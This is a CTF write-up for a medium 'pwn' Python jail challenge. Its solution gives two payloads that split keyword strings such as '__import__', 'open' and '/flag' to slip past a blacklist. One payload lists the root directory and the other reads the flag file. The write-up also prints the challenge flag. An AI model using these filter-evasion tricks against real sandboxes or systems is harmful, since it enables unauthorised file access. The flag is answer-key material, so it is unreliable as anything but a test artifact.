# "as" "df"

**Author**: TheMythologist

**Category**: pwn

## Description

Why use a python interpreter when there are online ones?

## Difficulty

Medium

## Solution

To list files:

```python
print(__builtins__.__dict__["__impo""rt__"]("o""s").listdir("/"))
```

To read the flag:

```python
print(getattr(__builtins__.__dict__["op""en"]("/fl""ag"),"re""ad")())
```

Flag: `SEE{every_ctf_must_have_a_python_jail_challenge_836a4218fb09b4a0ab0412e64de74315}`

## Deployment

`docker-compose up -d`
